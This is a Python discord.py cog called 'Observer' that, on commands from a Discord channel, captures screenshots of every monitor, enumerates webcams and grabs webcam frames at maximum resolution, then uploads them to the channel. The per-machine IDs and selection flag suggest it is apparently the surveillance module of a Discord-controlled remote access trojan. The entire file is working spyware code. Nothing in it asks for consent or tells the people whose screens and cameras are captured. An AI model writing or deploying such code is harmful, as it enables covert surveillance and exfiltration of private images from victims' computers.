import io
import cv2
import asyncio
import discord
import numpy as np
from mss import mss
from PIL import Image
from discord.ext import commands

class Observer(commands.Cog):
    def __init__(self, app: commands.Bot):
        self.bot = app
        self.cam_lock = asyncio.Lock()

    @commands.command(name="screenshot", aliases=["ss", "capture"])
    async def take_screenshot(self, ctx):
        if not getattr(self.bot, 'is_selected', False):
            return

        await self.process_screenshot(ctx)

    @commands.command(name="ssrun", aliases=["screenshotrun", "cprun"])
    async def run_screenshot(self, ctx, target_id: str):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not getattr(self.bot, 'is_selected', False):
            return

        if target_id != my_id:
            return

        await self.process_screenshot(ctx)

    async def process_screenshot(self, ctx):
        my_id = getattr(self.bot, 'port_id', 'Unknown')
        async with ctx.typing():
            try:
                def capture_screens():
                    file_list = []
                    
                    with mss() as sct:
                        monitors = sct.monitors[1:]
                        
                        if not monitors: 
                            monitors = [sct.monitors[0]]

                        for i, monitor in enumerate(monitors, start=1):
                            sct_img = sct.grab(monitor)
                            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                            
                            img_binary = io.BytesIO()
                            img.save(img_binary, 'PNG')
                            img_binary.seek(0)
                            
                            filename = f"{my_id}_Monitor_{i}.png"
                            file_list.append(discord.File(fp=img_binary, filename=filename))
                            
                    return file_list, len(monitors)
                loop = asyncio.get_running_loop()
                files, count = await loop.run_in_executor(None, capture_screens)
                if count > 1:
                    msg = f"**[{my_id}]** Multi-Monitor Captured ({count} screens)"
                else:
                    msg = f"**[{my_id}]** Screenshot captured."
                
                await ctx.send(content=msg, files=files)

                for file in files:
                    file.close()

            except Exception as e:
                await ctx.send(f"**[{my_id}]** Error: {e}")

    @commands.command(name="webcam", aliases=["cam"])
    async def take_webcam(self, ctx, num: int = 1):
        if not getattr(self.bot, 'is_selected', False):
            return
        
        await self.process_webcam(ctx, num)

    @commands.command(name="camrun")
    async def run_webcam(self, ctx, target_id: str, num: int = 1):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not getattr(self.bot, 'is_selected', False):
            return
        
        if target_id != my_id:
            return

        await self.process_webcam(ctx, num)
    
    # TODO: Fix Camera index out Issue
    @commands.command(name="camlist", aliases=["cams"])
    async def list_webcams(self, ctx, arg1: str = None, arg2: int = 1):    

        my_id = getattr(self.bot, 'port_id', 'Unknown')  

        if not getattr(self.bot, 'is_selected', False):
            return
        
        should_run = False
        target_id = None
        scan_num = 1
        if arg1 is None:
            pass
        elif arg1.isdigit():
            scan_num = int(arg1)
        else:
            target_id = arg1
            scan_num = int(arg2)

        if target_id is None:
            should_run = True
        elif target_id == my_id:
            should_run = True

        if not should_run:
            return    
        
        async with ctx.typing():
            try:
                def scan_cameras_dynamic():
                    report = []
                    found_count = 0
                    for idx in range(scan_num): 
                        cap = cv2.VideoCapture(idx, cv2.CAP_ANY)
                        if cap.isOpened():
                            ret, frame = cap.read()
                            print(cap, ret)
                            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                            hight = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                                
                            status = ""
                            if ret and np.sum(frame) > 0:
                                status = "**Active**"
                            elif ret and np.sum(frame) == 0:
                                status = "**Black**"
                            else:
                                status = "**Error**"

                            report.append(f"**Index {idx}:** {status} `({width}x{hight})`")
                            found_count += 1
                            cap.release() 
                    if not report:
                        return "No cameras detected.", 0
                    
                    return "\n".join(report), found_count

                loop = asyncio.get_running_loop()
                result_text, count = await loop.run_in_executor(None, scan_cameras_dynamic)
                
                embed = discord.Embed(
                    title=f"Connected Webcams - [{my_id}]",
                    description=f"**{count}** devices detected.\n\n{result_text}",
                    color=discord.Color.green() if count > 0 else discord.Color.red()
                )
                await ctx.send(embed=embed)

            except Exception as e:
                await ctx.send(f"**[{my_id}]** Error: {e}")

    async def process_webcam(self, ctx, num: int):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        target_index = num
        if target_index >= 1:
            target_index -= 1

        if self.cam_lock.locked():
            await ctx.send(f"**[{my_id}]** Camera is busy. Please wait...")
        async with self.cam_lock:
            async with ctx.typing():
                try:
                    def capture_cam_safe():
                        cap = cv2.VideoCapture(target_index, cv2.CAP_ANY)
                        if not cap.isOpened():
                            print("Cannot open camera")
                            cap = cv2.VideoCapture(target_index)
                            if not cap.isOpened():
                                return None, "Camera not found."

                        resolutions = [
                            (3840, 2160), # 4K
                            (2560, 1440), # QHD
                            (1920, 1080), # FHD 
                            (1280, 720),  # HD
                            (640, 480)    # VGA 
                        ]
                        
                        selected_res = "Default"

                        for width, height in resolutions:
                            cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
                            
                            actual_w = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
                            actual_h = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
                            
                            if actual_w == width and actual_h == height:
                                selected_res = f"{int(actual_w)}x{int(actual_h)}"
                                break

                        print(f"[Webcam] Resolution set to: {selected_res}")

                    
                        for _ in range(30):
                            ret, temp_frame = cap.read()
                            if not ret: continue
                            
                            if np.sum(temp_frame) > 0:
                                break
                        
                        for _ in range(5): cap.read()

                        ret, frame = cap.read()
                        cap.release()

                        if not ret:
                            return None, "Failed to capture."
                        
                        if np.sum(frame) == 0:
                            return None, "Captured black screen (Camera error)."

                        success, buffer = cv2.imencode(".png", frame)
                        if not success:
                            return None, "Encoding failed."

                        return io.BytesIO(buffer.tobytes()), selected_res

                    loop = asyncio.get_running_loop()
                    image_binary, res_info = await loop.run_in_executor(None, capture_cam_safe)

                    if image_binary:
                        file = discord.File(fp=image_binary, filename=f"webcam_{my_id}.png")
                        await ctx.send(f"**[{my_id}]** Captured ({res_info}).", file=file)
                        image_binary.close()
                    else:
                        await ctx.send(f"**[{my_id}]** Error: {res_info}")

                except Exception as e:
                    await ctx.send(f"**[{my_id}]** System Error: {e}")

async def setup(app: commands.Bot):
    await app.add_cog(Observer(app))